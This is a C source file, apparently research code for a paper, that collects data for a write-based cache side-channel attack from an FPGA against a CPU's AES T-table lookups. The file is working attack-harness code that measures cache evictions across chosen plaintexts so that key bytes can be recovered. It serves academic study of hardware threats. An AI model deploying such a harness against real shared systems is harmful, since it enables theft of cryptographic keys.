/**
 * @file data_collection_paper.c
 * @author Matteo Oldani
 * @version 0.1
 * @date 2023-01-18
 * 
 * This code implements the fast data collection for the 
 * write side channel attack on the FPGA to CPU threat model
 * 
 */
#include <stdio.h>
#include "platform.h"
#include "xil_printf.h"
#include <xwrite_attack.h>
#include "aes.h"

#define ANSI_COLOR_RED     "\x1b[31m"
#define ANSI_COLOR_GREEN   "\x1b[32m"
#define ANSI_COLOR_YELLOW  "\x1b[33m"
#define ANSI_COLOR_BLUE    "\x1b[34m"
#define ANSI_COLOR_MAGENTA "\x1b[35m"
#define ANSI_COLOR_CYAN    "\x1b[36m"
#define ANSI_COLOR_RESET   "\x1b[0m"

#define STRIDE 1

void xil_printf_colored(unsigned value){
    if(value <= 12){
        xil_printf(ANSI_COLOR_GREEN);
        xil_printf("%u  ", value);
        xil_printf(ANSI_COLOR_RESET);
    }else{
        xil_printf("%d  ", value);
    }
}

void rand_ptxt(unsigned char *ptxt, int exclude){
    for(int i=0; i<16; i++){
        if(i==exclude){continue;}
        ptxt[i] = (unsigned char)(rand()%256);
    }
}

int main()
{
    init_platform();

    volatile unsigned results[1024];
    unsigned int attack_results[512*256];
    XWrite_attack evicter;

    volatile uint32_t * array = (te0);

    unsigned char key[16]  = {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0};
    unsigned char ptxt[16] = {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0};
    unsigned char ctxt[16];

    // Array used to store the access patterns
    int n = 256;

    for(int i=0; i<256; i++){
        for(int j=0; j<256; j++){
            attack_results[i*n + j] = 0;
        }
    }

    for(int i=0; i<1024; i++){results[i] = 0;}

    xil_printf("\e[1;1H\e[2J");
    xil_printf(ANSI_COLOR_YELLOW);
    xil_printf("################ STARTING THE ATTACK ################\n\n\r");
    xil_printf(ANSI_COLOR_RESET);

    xil_printf("The address of te0 is: 0x%p\n\r", te0);
    xil_printf("The address of te1 is: 0x%p\n\r", te1);
    xil_printf("The address of te2 is: 0x%p\n\r", te2);
    xil_printf("The address of te3 is: 0x%p\n\r", te3);

    XWrite_attack_Initialize(&evicter, 0);
    XWrite_attack_Set_c_results(&evicter, (UINTPTR) results);
    XWrite_attack_Set_array_r(&evicter, (UINTPTR) array);

    // Loop over all the addresses
    for(int times = 0; times<256; times++){
            // Loop over all the possible plain texts
            for(unsigned b=0; b<256; b++){
                xil_printf("%d %d\r", times, b);

                ptxt[0] = b;
                rand_ptxt(ptxt, 0);

                // GET ATTACK DATA
                results[1020] = 32;
                results[1021] = STRIDE * 4 * 8;
                results[1022] = 0;
                results[1023] = 8;

                encrypt(key, ptxt, ctxt);
                XWrite_attack_Start(&evicter);
                while(!XWrite_attack_IsDone(&evicter));

                // END OF GET ATTACK DATA
                for(unsigned r=0;r<256;r=r+8){
                    if(results[r] > 14){
                        for(unsigned j=r; j<r+8; j++){
                            attack_results[j*n + b] += 1;
                        }
                    }
                }

            }

    }


    xil_printf("\n\r");
    for(int i=0; i<256; i++){
        for(int j=0; j<256; j++){
            xil_printf("%d ", attack_results[i*n + j]);
        }
        xil_printf("\n\r");
    }

    cleanup_platform();
    return 0;
}

